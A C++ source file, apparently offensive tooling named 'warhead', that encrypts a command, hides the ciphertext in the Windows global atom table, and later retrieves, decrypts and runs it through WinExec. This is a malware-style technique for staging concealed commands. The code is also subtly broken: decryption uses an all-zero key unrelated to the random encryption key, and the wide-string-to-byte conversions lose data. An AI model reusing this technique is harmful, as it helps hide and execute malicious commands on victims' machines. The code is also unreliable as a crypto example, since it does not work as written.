#include "warhead.h"
#include <stdexcept>
#include <iostream>
#include <memory>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

namespace warhead {
    // Helper function to handle CNG errors
    void ThrowOnError(NTSTATUS status, const std::string& message) {
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error(message + " Status: " + std::to_string(status));
        }
    }

    // Helper function to encrypt data using CNG
    std::vector<BYTE> encryptData(const std::vector<BYTE>& data, BCRYPT_ALG_HANDLE hAlg, BCRYPT_KEY_HANDLE hKey, std::vector<BYTE>& iv) {
        NTSTATUS status = 0;
        ULONG cbData = 0, cbCipherText = 0;
        
        // Use a random IV for each encryption
        iv.resize(16); // AES block size
        ThrowOnError(BCryptGenRandom(hAlg, iv.data(), static_cast<ULONG>(iv.size()), 0), "Failed to generate IV");

        // Get the size of the output buffer
        status = BCryptEncrypt(hKey, const_cast<PBYTE>(data.data()), static_cast<ULONG>(data.size()), NULL, iv.data(), static_cast<ULONG>(iv.size()), NULL, 0, &cbCipherText, 0);
        ThrowOnError(status, "BCryptEncrypt failed to get size");

        std::vector<BYTE> cipherText(cbCipherText);
        
        // Perform the encryption
        status = BCryptEncrypt(hKey, const_cast<PBYTE>(data.data()), static_cast<ULONG>(data.size()), NULL, iv.data(), static_cast<ULONG>(iv.size()), cipherText.data(), static_cast<ULONG>(cipherText.size()), &cbCipherText, 0);
        ThrowOnError(status, "BCryptEncrypt failed to encrypt data");

        cipherText.resize(cbCipherText); // Resize to actual encrypted data size
        return cipherText;
    }

    // Helper function to decrypt data using CNG
    std::vector<BYTE> decryptData(const std::vector<BYTE>& cipherText, BCRYPT_ALG_HANDLE hAlg, BCRYPT_KEY_HANDLE hKey, std::vector<BYTE>& iv) {
        NTSTATUS status = 0;
        ULONG cbData = 0;
        
        // Get the size of the output buffer
        status = BCryptDecrypt(hKey, const_cast<PBYTE>(cipherText.data()), static_cast<ULONG>(cipherText.size()), NULL, iv.data(), static_cast<ULONG>(iv.size()), NULL, 0, &cbData, 0);
        ThrowOnError(status, "BCryptDecrypt failed to get size");

        std::vector<BYTE> plainText(cbData);

        // Perform the decryption
        status = BCryptDecrypt(hKey, const_cast<PBYTE>(cipherText.data()), static_cast<ULONG>(cipherText.size()), NULL, iv.data(), static_cast<ULONG>(iv.size()), plainText.data(), static_cast<ULONG>(plainText.size()), &cbData, 0);
        ThrowOnError(status, "BCryptDecrypt failed to decrypt data");
        
        plainText.resize(cbData); // Resize to actual decrypted data size
        return plainText;
    }

    std::vector<ATOM> storeEncryptedCommandInAtoms(const std::wstring& command) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status = 0;

        // Open an algorithm handle for AES
        status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        ThrowOnError(status, "BCryptOpenAlgorithmProvider failed");

        // Set the chaining mode to CBC
        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        ThrowOnError(status, "BCryptSetProperty failed");

        // Generate a 256-bit symmetric key
        BYTE rgbKey[32] = {0};
        status = BCryptGenRandom(hAlg, rgbKey, sizeof(rgbKey), 0);
        ThrowOnError(status, "BCryptGenRandom failed to generate key");

        status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, rgbKey, sizeof(rgbKey), 0);
        ThrowOnError(status, "BCryptGenerateSymmetricKey failed");

        // Convert wstring to a byte vector
        std::vector<BYTE> data(command.begin(), command.end());
        std::vector<BYTE> iv;
        std::vector<BYTE> encryptedData = encryptData(data, hAlg, hKey, iv);
        
        // Combine IV and encrypted data
        std::vector<BYTE> combinedData = iv;
        combinedData.insert(combinedData.end(), encryptedData.begin(), encryptedData.end());

        // Convert the byte vector back to a wstring for storage
        std::wstring combinedWString(combinedData.begin(), combinedData.end());
        
        std::vector<ATOM> atomList;
        for (size_t i = 0; i < combinedWString.length(); i += 255) {
            std::wstring chunk = combinedWString.substr(i, 255);
            ATOM atom = GlobalAddAtomW(chunk.c_str());

            if (atom == 0) {
                // Cleanup handles before throwing
                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);
                throw std::runtime_error("Failed to add atom: " + std::to_string(GetLastError()));
            }
            atomList.push_back(atom);
        }

        // Cleanup
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);

        return atomList;
    }

    std::wstring retrieveAndDecryptCommandFromAtoms(const std::vector<ATOM>& atoms) {
        std::wstring combinedWString;
        for (ATOM atom : atoms) {
            int charCount = GlobalGetAtomNameW(atom, nullptr, 0);
            if (charCount == 0) {
                throw std::runtime_error("Failed to get atom name size: " + std::to_string(GetLastError()));
            }
            std::vector<wchar_t> buffer(charCount + 1);
            if (GlobalGetAtomNameW(atom, buffer.data(), charCount + 1) == 0) {
                throw std::runtime_error("Failed to get atom name: " + std::to_string(GetLastError()));
            }
            combinedWString += buffer.data();
        }

        // Convert the combined wstring back to a byte vector
        std::vector<BYTE> combinedData(combinedWString.begin(), combinedWString.end());
        
        if (combinedData.size() < 16) {
            throw std::runtime_error("Combined data is too short to contain IV and ciphertext.");
        }

        std::vector<BYTE> iv(combinedData.begin(), combinedData.begin() + 16);
        std::vector<BYTE> encryptedData(combinedData.begin() + 16, combinedData.end());

        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status = 0;

        status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        ThrowOnError(status, "BCryptOpenAlgorithmProvider failed");

        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        ThrowOnError(status, "BCryptSetProperty failed");
        
        // This is a dummy key. In a real-world scenario, you would need to securely derive or retrieve the key.
        // For this example, we assume the key is a global variable or part of a shared secret.
        BYTE rgbKey[32] = {0};
        status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, rgbKey, sizeof(rgbKey), 0);
        ThrowOnError(status, "BCryptGenerateSymmetricKey failed");

        std::vector<BYTE> decryptedData = decryptData(encryptedData, hAlg, hKey, iv);
        
        // Cleanup
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);

        return std::wstring(reinterpret_cast<const wchar_t*>(decryptedData.data()), decryptedData.size() / sizeof(wchar_t));
    }

    void executeEncryptedCommandFromAtoms(const std::vector<ATOM>& atoms) {
        std::wstring retrievedCommand = retrieveAndDecryptCommandFromAtoms(atoms);

        int size_needed = WideCharToMultiByte(CP_ACP, 0, retrievedCommand.c_str(), -1, NULL, 0, NULL, NULL);
        if (size_needed == 0) {
            throw std::runtime_error("Failed to convert wide string to narrow string.");
        }
        std::string commandA(size_needed, 0);
        WideCharToMultiByte(CP_ACP, 0, retrievedCommand.c_str(), -1, &commandA[0], size_needed, NULL, NULL);

        UINT result = WinExec(commandA.c_str(), SW_SHOW);
        if (result < 32) {
            throw std::runtime_error("Failed to execute command. Error code: " + std::to_string(result));
        }
    }

    void deleteAtoms(const std::vector<ATOM>& atoms) {
        for (ATOM atom : atoms) {
            GlobalDeleteAtom(atom);
        }
    }
}